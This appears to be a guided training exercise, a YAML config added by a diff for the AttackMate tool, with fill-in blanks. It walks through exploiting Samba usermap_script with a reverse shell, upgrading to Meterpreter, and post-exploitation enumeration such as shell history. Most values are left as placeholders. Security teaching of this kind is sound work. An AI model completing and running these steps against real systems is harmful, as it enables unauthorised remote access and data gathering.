@@ -1,0 +1,126 @@
+#
+# Exercise 3: Shell to Meterpreter Upgrade Guided Version
+#
+# Instructions:
+#     Each command skeleton is already in place.
+#     Replace every "???" placeholder with the correct value.
+#     Run with: attackmate --config ../config.yml exercise_03_meterpreter_upgrade_guided.yml
+#
+# Prerequisites: msfrpcd -P msf -a 127.0.0.1
+#
+
+vars:
+  # TODO: Replace with your actual IPs
+  TARGET: CHANGE_ME
+  ATTACKER: CHANGE_ME_ATTACKER
+  PAYLOAD_INITIAL: cmd/unix/reverse_perl
+  LPORT_INITIAL: "4422"
+  LPORT_UPGRADE: "4433"
+
+commands:
+  # ============================================
+  # PHASE 1: Get a Raw Shell
+  # ============================================
+
+  # TODO 1: Replace each "???":
+  #   - cmd: the Samba usermap_script exploit module path
+  #   - payload: the initial payload variable
+  #   - options RHOSTS: target IP variable
+  #   - payload_options LHOST: attacker IP variable
+  #   - payload_options LPORT: initial listener port variable
+  #   - creates_session: name this session "shell"
+  - type: msf-module
+    cmd: "???"
+    payload: "???"
+    options:
+      RHOSTS: "???"
+    payload_options:
+      LHOST: "???"
+      LPORT: "???"
+    creates_session: "???"
+
+  # TODO 2: Replace "???" with the command to verify shell access
+  - type: msf-session
+    session: shell
+    cmd: "???"
+
+  # TODO 3: Replace "???" to print the shell identity
+  # Expected output: "Shell identity: uid=0(root) ..."
+  - type: debug
+    cmd: "???"
+
+  # ============================================
+  # PHASE 2: Upgrade to Meterpreter
+  # ============================================
+
+  # TODO 4: Replace each "???":
+  #   - cmd: the post module that upgrades a shell to Meterpreter
+  #   - options SESSION: the builtin that holds the last MSF session ID
+  #   - payload: the Meterpreter payload (linux/x86/meterpreter/reverse_tcp)
+  #   - payload_options LHOST: attacker IP variable
+  #   - payload_options LPORT: upgrade listener port variable
+  #   - creates_session: name this session "meterpreter"
+  - type: msf-module
+    cmd: post/multi/manage/shell_to_meterpreter
+    options:
+      SESSION: "???"
+    payload: "???"
+    payload_options:
+      LHOST: "???"
+      LPORT: "???"
+    creates_session: "???"
+
+  # TODO 5: Replace "???" with the number of seconds to let the Meterpreter session initialize
+  - type: sleep
+    seconds: "???"
+
+  # ============================================
+  # PHASE 3: Meterpreter Post-Exploitation
+  # ============================================
+
+  # TODO 6a: Replace "???" with the stdapi command to get system information
+  # session and stdapi are already set
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: "???"
+
+  # TODO 6b: Replace "???" to print the sysinfo result
+  - type: debug
+    cmd: "???"
+
+  # TODO 7a: Replace "???" with the stdapi command to get the current user/uid
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: "???"
+
+  # TODO 7b: Replace "???" to print who we are running as
+  - type: debug
+    cmd: "???"
+
+  # TODO 8: Replace "???" with the stdapi command to list running processes
+  - type: msf-session
+    session: meterpreter
+    stdapi: True
+    cmd: "???"
+
+  # ============================================
+  # PHASE 4: Post Modules
+  # ============================================
+
+  # TODO 9: Replace each "???":
+  #   - cmd: post module that enumerates shell history for users
+  #   - options SESSION: the builtin for the last MSF session
+  - type: msf-module
+    cmd: post/linux/gather/enum_users_history
+    options:
+      SESSION: "???"
+
+  # TODO 10: Replace each "???":
+  #   - cmd: post module that enumerates security protections (ASLR, SELinux, etc.)
+  #   - options SESSION: the builtin for the last MSF session
+  - type: msf-module
+    cmd: "???"
+    options:
+      SESSION: "???"
